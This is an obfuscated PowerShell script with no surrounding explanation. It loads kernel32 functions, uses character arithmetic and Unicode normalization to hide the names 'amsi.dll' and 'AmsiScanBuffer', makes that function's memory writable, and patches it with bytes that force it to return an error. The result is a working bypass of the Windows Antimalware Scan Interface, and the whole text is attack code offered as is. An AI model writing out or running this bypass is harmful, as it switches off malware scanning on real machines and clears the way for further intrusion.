$WXqeUw1oHp1C = @"
using System;
using System.Runtime.InteropServices;
public class WXqeUw1oHp1C {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr tOCRkbC1iocTf_H, string NdvTgbxPhWZ);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr e6IXp_PDT_twMc, UIntPtr hcLTDcJBTHPT, uint smL4DxrwkzR, out uint zZMk);
}
"@

Add-Type $WXqeUw1oHp1C

$gWAgOpa_XcN = [WXqeUw1oHp1C]::LoadLibrary("$(('ãmsî'+'.dll').NormAliZE([char](70*46/46)+[cHaR](111+11-11)+[cHaR]([byTE]0x72)+[Char](109+9-9)+[chAR](68*60/60)) -replace [cHAR]([BYTE]0x5c)+[chAR](112*57/57)+[char](123+19-19)+[cHaR](77+27-27)+[chaR](110)+[cHAR](125+63-63))")
$rIu1W6hzY = [WXqeUw1oHp1C]::GetProcAddress($gWAgOpa_XcN, "$(('ÃmsìScânB'+'ùffér').nORMaLiZe([cHar]([bytE]0x46)+[ChaR]([bYTE]0x6f)+[cHAr]([BytE]0x72)+[chAR]([byTE]0x6d)+[Char](21+47)) -replace [cHAr]([ByTe]0x5c)+[chAR](62+50)+[chAr]([BytE]0x7b)+[CHAR]([byte]0x4d)+[chAr]([BYTE]0x6e)+[CHAr](125*15/15))")
$p = 0
[WXqeUw1oHp1C]::VirtualProtect($rIu1W6hzY, [uint32]5, 0x40, [ref]$p)
$sB5azjstPELH6XGhXw3G = "0xB8"
$jjbIwBtd13cfrHzV = "0x57"
$_Rwdi7BPXfGtJ4AHf0 = "0x00"
$NH3fRPRfLlBUyu6nz1RU = "0x07"
$rMPSMNFtGv = "0x80"
$YNUMhPLVQekUA3L1NIs = "0xC3"
$DBo3BFyAN8Y = [Byte[]] ($sB5azjstPELH6XGhXw3G,$jjbIwBtd13cfrHzV,$_Rwdi7BPXfGtJ4AHf0,$NH3fRPRfLlBUyu6nz1RU,+$rMPSMNFtGv,+$YNUMhPLVQekUA3L1NIs)
[System.Runtime.InteropServices.Marshal]::Copy($DBo3BFyAN8Y, 0, $rIu1W6hzY, 6)